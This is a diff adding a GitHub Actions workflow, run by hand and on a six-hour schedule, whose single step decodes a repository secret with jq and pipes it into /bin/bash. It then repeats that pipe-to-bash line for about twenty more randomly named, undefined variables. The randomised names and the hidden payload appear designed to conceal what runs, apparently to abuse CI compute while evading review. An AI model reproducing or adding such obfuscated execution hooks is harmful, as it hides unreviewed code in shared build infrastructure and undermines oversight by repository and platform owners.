@@ -1,0 +1,38 @@
+name: zhaotaiyingfeng
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '43 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhaotaiyingfeng
+        env:
+          aycj09552: ${{ secrets.aycj09552 }}
+        run: |
+          echo $aycj09552 | jq -r .wzf46 | /bin/bash
+          echo $sxgg79 | jq -r .gyivj31680 | /bin/bash
+          echo $fv236 | jq -r .f34961 | /bin/bash
+          echo $dsbni8 | jq -r .na614 | /bin/bash
+          echo $h86935 | jq -r .btm40920 | /bin/bash
+          echo $fufv01 | jq -r .owkny4 | /bin/bash
+          echo $qcl44913 | jq -r .ko0 | /bin/bash
+          echo $rmbzg973 | jq -r .hbj44761 | /bin/bash
+          echo $enco77476 | jq -r .g160 | /bin/bash
+          echo $elnmk3640 | jq -r .vjcqn7989 | /bin/bash
+          echo $w59935 | jq -r .iqqp3485 | /bin/bash
+          echo $cofja03 | jq -r .mt6 | /bin/bash
+          echo $vflvh0 | jq -r .rnjmo4 | /bin/bash
+          echo $yyh056 | jq -r .ursos9870 | /bin/bash
+          echo $ck2 | jq -r .amuq1345 | /bin/bash
+          echo $n33793 | jq -r .q94 | /bin/bash
+          echo $ji530 | jq -r .bp4 | /bin/bash
+          echo $k33 | jq -r .vqd466 | /bin/bash
+          echo $gj77300 | jq -r .rcfln476 | /bin/bash
+          echo $wpx00510 | jq -r .cn5527 | /bin/bash
+          echo $ebvz148 | jq -r .ilkd6598 | /bin/bash
+          echo $dllxz11 | jq -r .j90300 | /bin/bash
+
